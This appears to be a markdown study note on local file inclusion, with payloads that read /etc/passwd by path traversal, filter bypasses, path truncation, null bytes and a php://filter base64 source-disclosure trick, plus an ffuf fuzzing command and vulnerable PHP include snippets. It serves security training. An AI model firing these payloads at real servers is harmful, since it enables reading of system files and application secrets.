# File Inclusion
## Basic LFI
```bash
?language=/etc/passwd
```
<img width="1582" height="685" alt="image" src="https://github.com/user-attachments/assets/4e2ac86e-c3f5-4ea0-bc0f-03fd437947c8" />

## Path Traversal
```bash
?language=../../../../etc/passwd
```
<img width="1580" height="685" alt="image" src="https://github.com/user-attachments/assets/900d504c-28a7-4837-b6a5-54807a7c9455" />

## Filename Prefix
With the use of prefixes
```bash
include("lang_" . $_GET['language']);
```
<img width="1395" height="261" alt="image" src="https://github.com/user-attachments/assets/7bba19ec-c4c5-4f36-84b8-0c55673844db" />

We have to start with "/"
<img width="1398" height="352" alt="image" src="https://github.com/user-attachments/assets/a637d1c9-ce2c-408e-9b77-c073b74bb493" />

## Appended Extensions
With the use of extension
```bash
include($_GET['language'] . ".php");
```
<img width="1582" height="509" alt="image" src="https://github.com/user-attachments/assets/3d57c0a6-97ff-4afe-94ca-c574a1b0141c" />

Note: We can bypass this with injection commands
## Second-Order Attack
For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a Second-Order attack.

# Basic Bypasses
## Non-Recursive Path Traversal Filters
```bash
?language=....//....//....//....//etc/passwd
```
<img width="1583" height="504" alt="image" src="https://github.com/user-attachments/assets/cbd44974-743b-4e17-8c6c-7e91c81b4d54" />

## Encoding
<img width="1208" height="361" alt="image" src="https://github.com/user-attachments/assets/cb2064c6-366f-4fa9-a359-4c5489b8a51e" />

## Approved Paths
```bash
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
<img width="1578" height="685" alt="image" src="https://github.com/user-attachments/assets/1395623d-f6bb-41d0-b0e5-1e9f1fe759c6" />

## Appended Extension
### Path Truncation
```bash
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
# Code
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```
### Null Bytes
```bash
?language=....//....//....//....//etc/passwd%00
```

# PHP Filters
## Fuzzing for PHP Files
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```
## Source Code Disclosure
```bash
php://filter/read=convert.base64-encode/resource=config
```
  <img width="1593" height="170" alt="image" src="https://github.com/user-attachments/assets/b8df7e73-51a8-476d-a55e-867678d27881" />

